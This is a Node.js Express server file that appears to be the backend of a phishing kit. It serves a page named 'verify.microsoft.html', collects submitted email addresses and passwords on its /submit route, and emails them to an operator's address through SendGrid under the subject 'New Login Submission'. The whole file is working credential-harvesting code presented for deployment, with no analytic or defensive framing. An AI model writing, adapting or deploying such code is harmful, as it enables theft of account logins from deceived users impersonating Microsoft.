const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ===== DEBUG: Check what Railway passes =====
console.log('=== Environment Variables ===');
console.log('Keys available in process.env:', Object.keys(process.env));

// Retrieve env vars
const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;

// Configure SendGrid only if key exists
if (SENDGRID_API_KEY && RECEIVER_EMAIL) {
  sgMail.setApiKey(SENDGRID_API_KEY);
  console.log('✅ SendGrid is configured.');
} else {
  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will NOT be sent.');
}

// ===== Routes =====

// Home page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
});

// Form submission
app.post('/submit', async (req, res) => {
  const { email, password } = req.body;

  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
    console.warn('⚠️ Cannot send email: Missing env vars.');
    return res.status(500).send('Server not configured to send emails.');
  }

  const msg = {
    to: RECEIVER_EMAIL,
    from: RECEIVER_EMAIL,
    subject: 'New Login Submission',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    await sgMail.send(msg);
    res.send('✅ Form submitted. Email sent!');
  } catch (error) {
    console.error('SendGrid error:', error);
    res.status(500).send('❌ Error sending email.');
  }
});

// Test route to verify SendGrid
app.get('/test', async (req, res) => {
  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
    return res.send('⚠️ Env vars missing. Cannot send test email.');
  }

  try {
    await sgMail.send({
      to: RECEIVER_EMAIL,
      from: RECEIVER_EMAIL,
      subject: 'Test Email from Railway',
      text: 'This is a test email to verify environment variables.',
    });
    res.send('✅ Test email sent!');
  } catch (error) {
    console.error('SendGrid test error:', error);
    res.send('❌ Test email failed. Check logs.');
  }
});

// Start server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
